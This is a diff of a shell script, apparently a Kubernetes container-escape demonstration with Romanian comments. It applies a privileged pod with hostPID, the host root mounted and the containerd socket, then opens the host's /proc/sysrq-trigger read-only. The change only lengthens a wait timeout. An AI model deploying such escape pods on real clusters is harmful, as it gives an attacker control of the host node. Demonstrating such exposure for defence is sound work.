@@ -24,13 +24,13 @@ echo ""
 # ---------------------------------------------------------------------------
 echo "[step 1/6] kubectl apply escape-pod.yaml (privileged, hostPID, hostPath /, containerd.sock)"
 kubectl apply -f "$HERE/escape-pod.yaml"
-echo "  ... astept pod Ready (max 60s)"
-kubectl wait --for=condition=Ready pod/$EPOD -n $NS --timeout=60s || kubectl get pod $EPOD -n $NS
+echo "  ... astept pod Ready (max 180s; disk lent)"
+kubectl wait --for=condition=Ready pod/$EPOD -n $NS --timeout=180s || kubectl get pod $EPOD -n $NS
 echo ""
 sleep 2
 
 # ---------------------------------------------------------------------------
-# step 2/6 - Acces /proc/sysrq-trigger (interfata kernel host, read-only - NU scriem!)
+# step 2/6 - Acces /proc/sysrq-trigger (interfata kernel host, read-only)
 # ---------------------------------------------------------------------------
 echo "[step 2/6] cat /proc/sysrq-trigger (open read-only - NU declanseaza nimic periculos)"
 kubectl exec -n $NS $EPOD -- bash -c "head -c 0 /proc/sysrq-trigger 2>&1; echo 'opened /proc/sysrq-trigger (read-only)'"
